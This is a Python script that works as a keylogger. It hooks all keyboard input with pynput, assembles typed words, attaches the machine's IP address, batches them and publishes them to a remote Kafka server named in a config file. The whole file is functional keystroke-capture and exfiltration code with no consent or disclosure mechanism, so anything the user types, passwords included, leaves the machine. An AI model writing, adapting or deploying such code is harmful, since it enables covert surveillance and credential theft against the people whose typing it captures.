from pynput.keyboard import Key, Listener
import socket
from user_details import UserDetails
from kafka_producer import KeyboardInputProducer
from configparser import SafeConfigParser

currentString = ''

producer = None

cache = []
cache_size = 20


def append_string(character):
    global currentString
    currentString += character


def delete_last_character():
    global currentString
    new_string = ''
    for i in range(0, len(currentString) - 1):
        new_string += currentString[i]
    currentString = new_string


def get_ip_address():
    return socket.gethostbyname(socket.gethostname())


def prepare_body(ip_address, message):
    return {'ipAddress': ip_address, 'message': message}


def clear_string():
    global currentString
    currentString = ''


def get_config_parser():
    parser = SafeConfigParser()
    parser.read('application.ini')
    return parser


def get_topic():
    parser = get_config_parser()
    return parser.get('destination', 'topic')


def get_bootstrap_server():
    parser = get_config_parser()
    return parser.get('destination', 'bootstrap_server')


def publish_on_topic(user_details: UserDetails):
    global producer
    if producer is None:
        producer = KeyboardInputProducer(bootstrap_server=get_bootstrap_server(), topic=get_topic())
    producer.publish_message(user_details)


def send_message(message):
    if message == '' or message is None: return
    ip = get_ip_address()
    user_details = UserDetails(ip, message)
    add_to_cache(user_details)


def clear_cache():
    global cache
    cache = []


def add_to_cache(details: UserDetails):
    global cache
    global cache_size
    cache.append(details)
    if len(cache) > cache_size:
        send_cache(cache)
        clear_cache()


def send_cache(cache: list):
    for details in cache:
        publish_on_topic(details)


def on_press(key):
    global currentString
    if is_whitespace(key):
        send_message(currentString)
        clear_string()
    elif key is Key.backspace:
        delete_last_character()
    else:
        if not (str(key)[1] == 'e' and hasattr(key, 'name')):
            append_string(str(key)[1])


def is_whitespace(key):
    return key in [Key.enter, Key.space, Key.tab]


with Listener(on_press=on_press) as listener:
    listener.join()
